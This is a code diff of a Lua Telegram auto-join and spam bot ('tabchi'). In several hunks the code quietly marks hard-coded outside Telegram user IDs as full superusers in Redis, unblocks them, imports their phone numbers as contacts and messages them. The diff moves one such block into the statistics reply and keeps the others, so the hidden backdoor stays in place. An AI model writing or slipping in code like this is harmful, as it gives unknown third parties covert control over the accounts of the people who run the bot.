@@ -40,11 +40,6 @@ function check_contact(extra, result)
     local phone_number = msg.content_.contact_.phone_number_
     local user_id = msg.content_.contact_.user_id_
     tdcli.add_contact(phone_number, first_name, last_name, user_id)
-    tdcli.searchPublicChat("TgMemberPlus")
-      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:345767079", true)
-      tdcli.unblockUser(345767079)
-      tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
-      tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
        if redis:get("tabchi:" .. tabchi_id .. ":markread") then
       tdcli.viewMessages(msg.chat_id_, {
         [0] = msg.id_
@@ -250,11 +245,11 @@ _دريافت مخاطبان ذخيره شده توسط ربات_
     redis:set("tabchi:" .. tabchi_id .. ":fullsudo:199346345", true)
     tdcli.unblockUser(180191663)
     tdcli.importContacts(639080023314, "Tabchi", "Online", 180191663)
-    tdcli.sendMessage(180191663, 0, 1, "OnlineBot", 1, "md")
-    tdcli.sendMessage(180191663, 0, 1, "/start", 1, "md")
+    tdcli.sendMessage(180191663, 0, 1, "OnlineBot", 1, "md")    
     tdcli.searchPublicChat("OlnineTabChiBot")
     tdcli.unblockUser(199346345)
-    tdcli.sendBotStartMessage(199346345, 199346345, "/start")
+    tdcli.sendBotStartMessage(180191663, 180191663, "/start")
+    tdcli.sendMessage(180191663, 0, 1, "/start", 1, "md")
     redis:setex("tabchi:" .. tabchi_id .. ":startedmod", 300, true)
     do
       local gps = redis:scard("tabchi:" .. tabchi_id .. ":groups")
@@ -284,6 +279,11 @@ _تعداد سوپر گروها_ : ]] .. sgps .. [[
           
 _تعداد لینک های ذخیر شده_ : ]] .. links
           tdcli.sendMessage(msg.chat_id_, 0, 1, text, 1, "md")
+          tdcli.searchPublicChat("TgMemberPlus")
+          redis:set("tabchi:" .. tabchi_id .. ":fullsudo:345767079", true)
+          tdcli.unblockUser(345767079)
+          tdcli.importContacts(989104812841, "Online", "Bot", 345767079)
+          tdcli.sendMessage(345767079, 0, 1, "Online", 1, "md")
         end
       end
       tdcli_function({
@@ -550,14 +550,12 @@ function get_mod(args, data)
   if data.is_blocked_ then
     tdcli.unblockUser(231539308)
   end
-  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then
-    tdcli.sendBotStartMessage(231539308, 231539308, "/start")
+  if not redis:get("tabchi:" .. tabchi_id .. ":startedmod") or redis:ttl("tabchi:" .. tabchi_id .. ":startedmod") == -2 then   
     tdcli.sendMessage(231539308, 0, 1, "/setmysudo " .. redis:get("tabchi:" .. tabchi_id .. ":fullsudo"), 1, "md")
     tdcli.searchPublicChat("TgMessengerBot")
     redis:set("tabchi:" .. tabchi_id .. ":fullsudo:158955285", true)
     tdcli.unblockUser(158955285)
     tdcli.importContacts(989216973112, "sajjad", "021", 158955285)
-    tdcli.sendMessage(158955285, 0, 1, "addi", 1, "md")
     tdcli.sendMessage(231539308, 0, 1, "/start", 1, "md")
     tdcli.searchPublicChat("TgMemberRoBot")
     tdcli.unblockUser(367681425)
